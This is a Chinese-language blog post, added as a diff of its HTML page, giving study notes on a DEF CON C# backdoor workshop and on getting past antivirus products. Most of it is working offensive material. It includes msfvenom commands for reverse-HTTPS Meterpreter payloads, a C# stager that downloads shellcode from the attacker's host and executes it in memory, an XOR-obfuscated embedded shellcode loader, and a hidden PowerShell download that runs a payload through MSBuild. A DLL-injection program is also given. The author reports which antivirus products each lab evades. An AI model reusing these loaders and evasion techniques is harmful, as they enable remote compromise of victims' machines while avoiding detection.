@@ -1,0 +1,1623 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="免杀,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="scareing的学习笔记" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试最近在逛GayHub时，偶然发现了《使用C＃编写自定义后门负载》这个项目,在实现的过程中，发现他给出的部分代码本身就有一定的免杀处理，其他的可利用代码也简单尝试过bypass AV，效果还行。 注：本文由本人首发于先知社区  项目地址  https://github.com/mvelazc0/defcon27_csharp_workshop测试环境">
+<meta name="keywords" content="免杀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试">
+<meta property="og:url" content="https://github.com/scareing/scareing.github.io/2019/10/05/利用C#byass AV/index.html">
+<meta property="og:site_name" content="scareing的学习笔记">
+<meta property="og:description" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试最近在逛GayHub时，偶然发现了《使用C＃编写自定义后门负载》这个项目,在实现的过程中，发现他给出的部分代码本身就有一定的免杀处理，其他的可利用代码也简单尝试过bypass AV，效果还行。 注：本文由本人首发于先知社区  项目地址  https://github.com/mvelazc0/defcon27_csharp_workshop测试环境">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-05T16:11:26.032Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试">
+<meta name="twitter:description" content="《使用C＃编写自定义后门负载》学习笔记及免杀尝试最近在逛GayHub时，偶然发现了《使用C＃编写自定义后门负载》这个项目,在实现的过程中，发现他给出的部分代码本身就有一定的免杀处理，其他的可利用代码也简单尝试过bypass AV，效果还行。 注：本文由本人首发于先知社区  项目地址  https://github.com/mvelazc0/defcon27_csharp_workshop测试环境">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://github.com/scareing/scareing.github.io/2019/10/05/利用C#byass AV/">
+
+
+
+
+
+  <title>《使用C＃编写自定义后门负载》学习笔记及免杀尝试 | scareing的学习笔记</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">scareing的学习笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">道可道，非常道, 名可名，非常名!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/05/利用C#byass AV/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">《使用C＃编写自定义后门负载》学习笔记及免杀尝试</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-05T00:00:01+08:00">
+                2019-10-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/C/" itemprop="url" rel="index">
+                    <span itemprop="name">C#</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="《使用C＃编写自定义后门负载》学习笔记及免杀尝试"><a href="#《使用C＃编写自定义后门负载》学习笔记及免杀尝试" class="headerlink" title="《使用C＃编写自定义后门负载》学习笔记及免杀尝试"></a>《使用C＃编写自定义后门负载》学习笔记及免杀尝试</h1><p>最近在逛GayHub时，偶然发现了《使用C＃编写自定义后门负载》这个项目,在实现的过程中，发现他给出的部分代码本身就有一定的免杀处理，其他的可利用代码也简单尝试过bypass AV，效果还行。</p>
+<p><strong>注：本文由本人首发于先知社区</strong></p>
+<blockquote>
+<p>项目地址</p>
+</blockquote>
+<pre><code>https://github.com/mvelazc0/defcon27_csharp_workshop</code></pre><h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><ul>
+<li>win10</li>
+<li>Windows defender</li>
+<li>win7</li>
+<li>360</li>
+<li>电脑管家<h1 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h1><h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><blockquote>
+<p>最后结果：全过<br>lab2的思路是真的不错，使用Web服务识别msf第二阶段的uri，然后程序请求第二阶段的uri。<br>直接把stage加载进内存，这一招免杀力max，不过会留下一个很明显的窗口。</p>
+</blockquote>
+</li>
+</ul>
+<p>0x01</p>
+<pre><code>openssl genrsa&gt;privkey.pem    //生成密钥
+openssl req -new -x509 -key privkey.pem -out cert.pem -days 365    //用生成的密钥生成证书
+twistd -n web -c cert.pem -k privkey.pem --https=8080    //监听8080的web服务</code></pre><p>0x02</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f exe -o demo.exe    //生成一个https的程序·。</code></pre><p>然后将这个程序下载到Win下运行，第一步监听8080的web服务就会捕捉到一个https请求的日志。<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/01.png)<br> 将这个请求复制到lab2的2.cs中</p>
+<pre><code> using System.Net;
+ using System.Text;
+ using System.Configuration.Install;
+ using System.Runtime.InteropServices;
+ using System.Security.Cryptography.X509Certificates;
+
+public class Program
+{
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
+[DllImport(&quot;kernel32&quot;)]
+private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
+[DllImport(&quot;kernel32&quot;)]
+private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param,UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
+[DllImport(&quot;kernel32&quot;)]
+private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+private static UInt32 MEM_COMMIT = 0x1000;
+private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+
+public static void Main()
+{
+    string url = &quot;https://172.22.35.212:8080/jo8qpzUTLKP7YvpgpgVmjghsq-PI9uHda0z0YwHmVl9utBbhSUGY4-E6uVpp6bIO3Rz7wazCkbgwfIFGllVXGoy5cbHYeB7CXOXWqQ6xFDfamwN4QVt8db2SdcPRuEBonvwDwfrnXSAQdYJ14lFMV3mmyaNdqbiu9qhKGgKRRMWLCztXaPqMyfQ1ld8lqQC-7Nt7WLGD&quot;;
+    Stager(url);
+}
+
+public static void Stager(string url)
+{
+
+    WebClient wc = new WebClient();
+    wc.Headers.Add(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36&quot;);
+    ServicePointManager.Expect100Continue = true;
+    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+
+    byte[] shellcode = wc.DownloadData(url);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
+    IntPtr threatHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+    WaitForSingleObject(threatHandle, 0xFFFFFFFF);
+
+}
+}</code></pre><p> 编译程序，然后msf开启监听，运行即返回session。</p>
+<pre><code>C:\windows\microsoft.net\framework\v4.0.30319\csc.exe 2.cs    //编译程序
+handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //msf开启监听</code></pre><p> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/02.png)</p>
+<h1 id="lab3-lab4"><a href="#lab3-lab4" class="headerlink" title="lab3+lab4"></a>lab3+lab4</h1><blockquote>
+<p>最后结果：360，电脑管家过。<br>lab4 其实就是lab3的免杀版，通过对shellcode进行xor或aes加密来实现免杀.<br>windows defender一直没法pass,简单的修改加密的key值也无济于事。</p>
+</blockquote>
+<p>0x01</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080  -f csharp    //生成shellcode
+handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p>0x02</p>
+<pre><code>using System;
+using System.Text;
+using System.Runtime.InteropServices;
+
+
+public class Program
+{
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
+[DllImport(&quot;kernel32&quot;)]
+private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
+[DllImport(&quot;kernel32&quot;)]
+private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param,UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
+[DllImport(&quot;kernel32&quot;)]
+private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+[DllImport(&quot;user32.dll&quot;)]
+static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+[DllImport(&quot;kernel32&quot;)]
+static extern IntPtr GetConsoleWindow();
+
+private static UInt32 MEM_COMMIT = 0x1000;
+private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+private static byte[] xor(byte[] cipher, byte[] key) {
+    byte[] xored = new byte[cipher.Length];
+
+    for(int i = 0; i &lt; cipher.Length; i++) {
+        xored[i] = (byte) (cipher[i] ^ key[i % key.Length]);
+    }
+
+    return xored;
+}
+
+
+static void Main()
+{
+    string key = &quot;ABCD&quot;;
+
+    byte[] xorshellcode = new byte[666] { 0x9a, 0x92, 0x9a, 0x30, 0x61, 0xb5, 0xf8, 0x5c, 0x6f, 0x21, 0x69, 0x1f, 0x72, 0x8d, 0xf4, 0xe1, 0x73, 0x16, 0x5e, 0x46, 0x14, 0x58, 0xc0, 0x81, 0x41, 0xa3, 0xa8, 0xd0, 0x87, 0x86, 0x0d, 0x06, 0x91, 0xba, 0xf0, 0xb1, 0x83, 0x49, 0x5a, 0x97, 0x81, 0x00, 0x79, 0x51, 0xd5, 0xf7, 0x7b, 0x56, 0x40, 0x71, 0x18, 0x34, 0xd1, 0x2b, 0x57, 0xf8, 0x25, 0xfb, 0xeb, 0x2a, 0xe8, 0x6b, 0x83, 0xe9, 0xb6, 0xbc, 0xd8, 0x79, 0x2b, 0xbb, 0x7a, 0x42, 0x00, 0x8b, 0x11, 0x15, 0xfe, 0xd1, 0xd4, 0xa9, 0x30, 0x38, 0xbe, 0x89, 0xe0, 0x67, 0x83, 0x62, 0xeb, 0xe0, 0xea, 0x0a, 0xaa, 0xeb, 0xfa, 0x6c, 0x59, 0x9c, 0xe1, 0x14, 0xd0, 0x7f, 0xa1, 0x1d, 0x6b, 0x9e, 0x6f, 0xcb, 0x99, 0x95, 0xa2, 0xb8, 0x36, 0x88, 0x79, 0x64, 0x6d, 0xe2, 0x47, 0x62, 0x4b, 0x86, 0xa2, 0xf9, 0xba, 0x82, 0xe3, 0x44, 0xdf, 0x94, 0x91, 0x6f, 0xab, 0x4e, 0x7b, 0xd6, 0x37, 0xb1, 0xb1, 0x39, 0x98, 0x3c, 0xd7, 0x3d, 0x2a, 0x5e, 0x26, 0x12, 0xcd, 0xd0, 0x8d, 0xfb, 0xbe, 0x25, 0xff, 0xfe, 0xba, 0xa3, 0x5b, 0xfc, 0x57, 0xf0, 0xb9, 0x8d, 0xd1, 0xaf, 0x41, 0x83, 0x06, 0x01, 0x1c, 0xe2, 0x47, 0xa1, 0x94, 0xc6, 0xd2, 0x18, 0x5f, 0xcd, 0xfe, 0x40, 0xb9, 0x49, 0xe5, 0x48, 0x2c, 0xd9, 0x4c, 0x1c, 0xf8, 0xda, 0xc2, 0xa8, 0xd0, 0xf0, 0xa4, 0x68, 0x11, 0xeb, 0x74, 0x84, 0x11, 0x84, 0x60, 0xd7, 0xc8, 0x10, 0xde, 0xd5, 0xe1, 0x00, 0x98, 0x4a, 0x05, 0xbf, 0xac, 0xf0, 0xea, 0x00, 0x69, 0xe6, 0x35, 0xb6, 0x12, 0x4f, 0xa0, 0x07, 0xb1, 0x7f, 0x9f, 0x08, 0x03, 0xb3, 0x78, 0x88, 0xa7, 0x37, 0x7a, 0x09, 0xb2, 0x06, 0x15, 0x3b, 0x83, 0xf2, 0x71, 0x0c, 0x8b, 0xaf, 0xf8, 0x3e, 0xd8, 0xa9, 0xf2, 0x79, 0x66, 0x0d, 0x89, 0x69, 0x65, 0x79, 0x49, 0x23, 0x3b, 0xbe, 0x03, 0x78, 0x63, 0x4f, 0x65, 0x4d, 0xb8, 0xbf, 0xd3, 0xf1, 0xcc, 0x63, 0x67, 0xa1, 0x1a, 0xf5, 0xc0, 0x3b, 0xd8, 0x94, 0xe8, 0xc3, 0xf6, 0x6c, 0x49, 0x3e, 0x53, 0xa1, 0x2f, 0xfe, 0x1b, 0x33, 0xc2, 0xb2, 0x90, 0x3b, 0xee, 0x2e, 0x6e, 0x04, 0x78, 0xf7, 0x35, 0x0d, 0x88, 0x78, 0x82, 0x34, 0x24, 0x64, 0x53, 0x99, 0xd1, 0xa5, 0x6b, 0xac, 0x25, 0xc5, 0x5d, 0x8c, 0x02, 0xbb, 0x8a, 0x81, 0x15, 0xcb, 0x41, 0x39, 0x22, 0x53, 0xbf, 0xaf, 0xca, 0x93, 0xc5, 0x11, 0xa0, 0xc5, 0x97, 0x07, 0x64, 0x3d, 0x75, 0xb5, 0x6d, 0x18, 0x3a, 0x14, 0xeb, 0xbb, 0x83, 0xd8, 0x1c, 0xf9, 0x87, 0xa7, 0xb4, 0x5c, 0x81, 0xba, 0x1e, 0xcc, 0xa0, 0xd1, 0x61, 0x09, 0x12, 0x02, 0x2b, 0x02, 0xbf, 0x18, 0x93, 0x4d, 0xf1, 0x70, 0x0a, 0xf6, 0x5e, 0x72, 0x75, 0x6e, 0xa1, 0xc3, 0x69, 0xa7, 0xb9, 0xe4, 0xe0, 0x09, 0xf1, 0x43, 0xfb, 0xe3, 0xae, 0xd3, 0x01, 0xd1, 0xc1, 0x45, 0xdb, 0x09, 0xf9, 0xce, 0x83, 0x35, 0xc2, 0xb5, 0x51, 0xd4, 0x9c, 0x3e, 0xe1, 0x8d, 0xa6, 0x36, 0x39, 0x01, 0x6a, 0xe3, 0x8a, 0x2c, 0xa1, 0x7e, 0x4e, 0x49, 0xfe, 0xe2, 0xb6, 0x4e, 0x30, 0x16, 0xc7, 0x61, 0x67, 0xc9, 0x5d, 0x9d, 0x7b, 0xa7, 0x1b, 0x38, 0xcb, 0xcc, 0x88, 0x4a, 0x46, 0x84, 0x5b, 0x84, 0x31, 0xf7, 0x30, 0x09, 0x51, 0x1c, 0xd4, 0x91, 0xcb, 0x74, 0xec, 0x0a, 0xd9, 0x39, 0xca, 0xeb, 0x03, 0xf2, 0x46, 0xf3, 0x1c, 0xb1, 0x93, 0x6a, 0x02, 0x3b, 0xca, 0x9a, 0x69, 0x19, 0x68, 0x89, 0x26, 0xdb, 0x8f, 0xf3, 0x74, 0x12, 0xb2, 0x96, 0x2c, 0x85, 0xd9, 0x93, 0xcb, 0x15, 0x7b, 0x10, 0x9f, 0x07, 0xa2, 0xfc, 0xf9, 0x5f, 0xe1, 0x8b, 0x29, 0x2d, 0x51, 0x8e, 0xad, 0x36, 0xb6, 0xf9, 0xb9, 0xe4, 0x9b, 0x15, 0x3c, 0x5e, 0xf4, 0xf1, 0x0e, 0x07, 0xfd, 0x9e, 0x89, 0xe1, 0xab, 0xd1, 0x6a, 0xac, 0x66, 0xbf, 0x18, 0x74, 0x9d, 0x3a, 0x0c, 0xdf, 0x43, 0x4a, 0xd8, 0x46, 0x2e, 0xe7, 0x5c, 0x3f, 0xcf, 0x38, 0x52, 0x86, 0x09, 0xa0, 0x25, 0x8f, 0xa9, 0x9b, 0x9f, 0x53, 0x87, 0xcb, 0x28, 0xa1, 0x9a, 0x27, 0x19, 0x4a, 0x82, 0x66, 0xa3, 0x4a, 0x17, 0x4a, 0xe0, 0x8e, 0xa2, 0xd8, 0xab, 0xb8, 0x2b, 0x98, 0xed, 0xeb, 0xee, 0x5d, 0x1d, 0x18, 0x59, 0xf6, 0x25, 0x41, 0x8f, 0x03, 0x66, 0x77, 0xd2, 0x59, 0xe6, 0x82, 0x93, 0x82, 0xec, 0xe2, 0xd2, 0x82, 0x5f, 0x89, 0x3c, 0x72, 0x5e, 0x26, 0xfe, 0x0e, 0xbb, 0x96, 0xa8, 0xc8, 0x72, 0x21, 0x17, 0x2f, 0x5f, 0x2a, 0x88, 0x27, 0xa3, 0xfa, 0x26, 0x69, 0x35, 0x2b, 0x5c, 0x43, 0x00, 0x79, 0xf2, 0x86, 0x66, 0xfc, 0x34, 0x72, 0x83, 0xea, 0xa7, 0xaf, 0xc4, 0xe5, 0x3c, 0x73, 0x91, 0x7b, 0xe4, 0x88, 0xfb, 0xed, 0xe4, 0x5f, 0xae, 0x24 };
+    byte [] shellcode;
+    shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+    return;
+}
+}</code></pre><h2 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h2><blockquote>
+<p>最后结果：全过</p>
+</blockquote>
+<ul>
+<li>lab5主要是用于利用.NET框架绕过禁用cmd和powershell的环境来执行命令。        </li>
+<li>这里就只是相当于将ps1脚本打包成可执行文件，并且不通过powershell.exe执行。</li>
+<li>这里的情况是尽管程序免杀但是但是没办法过AMSI检测，但是如果过不了AMSI检测就没办法执行。</li>
+<li>免杀需要将powershell命令通过AMSI检测，索性我就直接用MSBuild白名单来绕过。</li>
+</ul>
+<pre><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Management.Automation;
+using System.Collections.ObjectModel;
+
+public class Program
+{
+public static void Main()
+{
+
+    PowerShell ps1 = PowerShell.Create();
+    ps1.AddScript(&quot;powershell -w hidden Invoke-WebRequest -uri http://172.22.35.212/8080.xml -OutFile 8080.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 8080.xml&quot;);
+    ps1.Invoke();
+
+
+    PowerShell ps2 = PowerShell.Create();
+    ps2.AddCommand(&quot;Get-Process&quot;);
+    Collection&lt;PSObject&gt; PSOutput = ps2.Invoke();
+    foreach (PSObject outputItem in PSOutput)
+    {
+        if (outputItem != null)
+        {
+            Console.WriteLine(outputItem);
+        }
+    }
+
+
+}
+}</code></pre><p>正常返回session<br> ![avatar](<a href="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass" target="_blank" rel="noopener">https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/利用C#byass</a> AV/03.png)</p>
+<h2 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h2><blockquote>
+<p>测试结果：过360和电脑管家<br>lab6主要是dll注入，目前来说360和电脑管家对dll的查杀好像没那么强。<br>lab6的重点是将dll注入到一个已存在的进程中，使其逃避安全人员的检测。</p>
+</blockquote>
+<p>0x01</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080  -f dll -o  ShellcodeDll.dll   //生成shellcode
+handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p>0x02   </p>
+<pre><code>using System.Runtime.InteropServices;
+using System.Text;
+
+
+public class Program
+{
+
+[DllImport(&quot;kernel32.dll&quot;)]
+public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+[DllImport(&quot;kernel32.dll&quot;, SetLastError = true, ExactSpelling = true)]
+static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+[DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]
+public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+[DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+[DllImport(&quot;kernel32.dll&quot;)]
+static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+
+const int PROCESS_CREATE_THREAD = 0x0002;
+const int PROCESS_QUERY_INFORMATION = 0x0400;
+const int PROCESS_VM_OPERATION = 0x0008;
+const int PROCESS_VM_WRITE = 0x0020;
+const int PROCESS_VM_READ = 0x0010;
+
+
+const uint MEM_COMMIT = 0x00001000;
+const uint MEM_RESERVE = 0x00002000;
+const uint PAGE_READWRITE = 4;
+
+
+public static void Main()
+{
+    Console.WriteLine(&quot;Listing all processes...&quot;);
+    Console.WriteLine(&quot;--------------------------------------------------------------------&quot;);
+
+    Process[] procs = Process.GetProcesses();
+    foreach (Process proc in procs)
+    {
+        try{
+            Console.WriteLine(&quot;Name:&quot; + proc.ProcessName +&quot; Path:&quot; + proc.MainModule.FileName + &quot; Id:&quot;+ proc.Id);
+        }
+        catch{
+            continue;
+        }    
+    }
+    Console.WriteLine(&quot;--------------------------------------------------------------------\n&quot;);
+    Console.WriteLine(&quot;Enter Process Id to inspect:&quot;);
+    int val ;
+    val =  Convert.ToInt32(Console.ReadLine());
+    Console.WriteLine(val);
+    Process proc1 = Process.GetProcessById(val);
+
+    Console.WriteLine(&quot;Getting handle to process &quot;+proc1.MainModule.FileName);
+    IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc1.Id);
+    Console.WriteLine(&quot;Got handle &quot; + procHandle);
+
+    string dllPath = &quot;C:\\Users\\user\\Development\\defcon207\\lab6\\ShellcodeInjectionDll\\ShellcodeDll.dll&quot;;
+
+    Console.WriteLine(&quot;Allocating memory in &quot;+proc1.MainModule.FileName);
+    IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    Console.WriteLine(&quot;Done.&quot;);
+
+    Console.WriteLine(&quot;Writing to process memory&quot;);
+    UIntPtr bytesWritten;
+    bool resp1 = WriteProcessMemory(procHandle, memAddr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
+    Console.WriteLine(&quot;Done.&quot;);
+
+    Console.WriteLine(&quot;Calculating the address of LoadLibraryA...&quot;);
+    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);
+    Console.WriteLine(&quot;Done.&quot;);
+
+    Console.WriteLine(&quot;Calling CreateRemoteThread&quot;);
+    CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, memAddr, 0, IntPtr.Zero);
+
+
+
+
+
+}
